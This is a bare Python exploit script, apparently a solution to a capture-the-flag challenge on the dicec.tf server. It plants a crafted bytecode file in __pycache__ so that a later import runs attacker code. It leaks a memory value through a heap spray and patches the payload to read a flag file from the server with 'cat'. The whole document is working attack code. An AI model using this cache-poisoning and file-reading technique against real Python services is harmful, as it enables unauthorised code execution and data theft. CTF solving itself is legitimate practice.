import uuid
import socket
import re

u = bytes(str(uuid.uuid4()).replace("-", ""), encoding="utf-8")

def run(session, code, option=b"1"):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("dicec.tf", 31337))
	s.sendall(u+b"\n")
	s.sendall(option+b"\n")
	s.sendall(session+b"\n")
	s.sendall(code+b"\n")
	r = True
	output = ""
	while r:
		r = s.recv(4096)
		output += r.decode("utf-8")
	return output

run(b"a.py", b"1+1\n")
run(b"b", b"import a\n2+2\n")
run(b"c.py", b"a = 1337\n")
run(b"__pycache__/c.cpython-39.pyc", open("payload.pyc", "rb").read()+b"\n")
leak = run(b"d", b"\n".join('A{} = b"{}"'.format(i, '\\x90\\xff\\x90\\xff\\x90\\xb3\\x64\\x3c\\x46\\x00\\x53\\x00'+'\\xff'*4).encode("utf-8") for i in range(100))+b"\n"+b"\n".join("del A{}".format(i).encode("utf-8") for i in range(0, 100, 2))+b"\n"+b"import c\n")
frozen = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])').sub('', leak).split("'")[1]
run(b"e.pyc", open("flag.pyc", "rb").read().replace(b"iDRi5Mw6yXI4XcTHfh2A", frozen.encode("utf-8"))+b"\n")
flag = "/flag."+re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])').sub('', run(b"f", b"import e\n")).split("flag.")[1].split(".")[0]+".txt"
run(b"g.pyc", open("flag.pyc", "rb").read().replace(b"iDRi5Mw6yXI4XcTHfh2A", frozen.encode("utf-8")).replace(b"z\x04ls /", b"z"+bytes((4+len(flag),))+b"cat "+flag.encode("utf-8"))+b"\n")
print(run(b"h", b"import g\n"))
